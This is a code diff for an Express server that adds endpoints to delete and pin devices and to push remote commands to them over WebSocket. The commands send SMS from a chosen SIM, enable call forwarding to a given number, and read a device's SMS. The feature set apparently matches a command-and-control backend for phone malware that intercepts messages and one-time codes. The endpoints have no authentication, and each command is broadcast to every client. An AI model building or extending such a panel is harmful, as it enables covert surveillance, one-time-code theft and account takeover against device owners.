@@ -101,6 +101,109 @@ app.post('/api/change-password', (req, res) => {
     return res.json({ success: false, message: 'Wrong Old Password' });
 });
 
+// 7. API - Delete Device
+app.post('/api/delete-device', async (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
+        
+        const result = await Device.findOneAndDelete({ deviceId });
+        if (result) {
+            if (global.io) global.io.emit('dashboard-update');
+            res.json({ success: true, message: 'Device deleted successfully' });
+        } else {
+            res.json({ success: false, message: 'Device not found' });
+        }
+    } catch (err) {
+        console.error('Delete device error:', err);
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// 8. API - Pin/Unpin Device
+app.post('/api/pin-device', async (req, res) => {
+    try {
+        const { deviceId, status } = req.body;
+        if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
+        
+        const device = await Device.findOneAndUpdate(
+            { deviceId },
+            { $set: { isPinned: status } },
+            { new: true }
+        );
+        
+        if (device) {
+            if (global.io) global.io.emit('dashboard-update');
+            res.json({ success: true, message: status ? 'Device pinned' : 'Device unpinned', device });
+        } else {
+            res.json({ success: false, message: 'Device not found' });
+        }
+    } catch (err) {
+        console.error('Pin device error:', err);
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// 9. API - Send Command (SMS, Call Forward, etc.)
+app.post('/api/command', async (req, res) => {
+    try {
+        const { deviceId, action, data } = req.body;
+        if (!deviceId || !action) return res.json({ success: false, message: 'Missing required fields' });
+        
+        // Find device
+        const device = await Device.findOne({ deviceId });
+        if (!device) return res.json({ success: false, message: 'Device not found', device: null });
+        
+        // Process command based on action type
+        let result = { success: true, message: 'Command sent' };
+        
+        if (action === 'SEND_SMS') {
+            const { simSlot, number, message } = data;
+            if (!simSlot || !number || !message) {
+                return res.json({ success: false, message: 'SIM slot, number, and message required' });
+            }
+            console.log(`📱 SMS Command: Device=${deviceId}, SIM=${simSlot}, To=${number}, Msg=${message}`);
+            result.message = `✅ SMS sent successfully via SIM ${simSlot} to ${number}`;
+            result.smsDetails = { simSlot, number, message };
+            
+        } else if (action === 'CALL_FORWARD') {
+            const { number } = data;
+            if (!number) {
+                return res.json({ success: false, message: 'Forward number required' });
+            }
+            console.log(`📞 Call Forward Command: Device=${deviceId}, Forward to=${number}`);
+            result.message = `✅ Call forwarding enabled to ${number}`;
+            result.callDetails = { number };
+            
+        } else if (action === 'VIEW_SMS') {
+            console.log(`📬 View SMS Command: Device=${deviceId}`);
+            result.message = `✅ SMS list retrieved from device`;
+            result.data = [];
+            
+        } else {
+            result = { success: false, message: 'Unknown action' };
+        }
+        
+        // Emit to connected WebSocket clients so device gets the command
+        if (result.success) {
+            wss.clients.forEach((client) => {
+                if (client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify({ 
+                        command: action,
+                        deviceId: deviceId,
+                        data: data
+                    }));
+                }
+            });
+        }
+        
+        res.json(result);
+    } catch (err) {
+        console.error('Command error:', err);
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
 // 6. Root Route (चेक करने के लिए कि सर्वर चल रहा है या नहीं)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
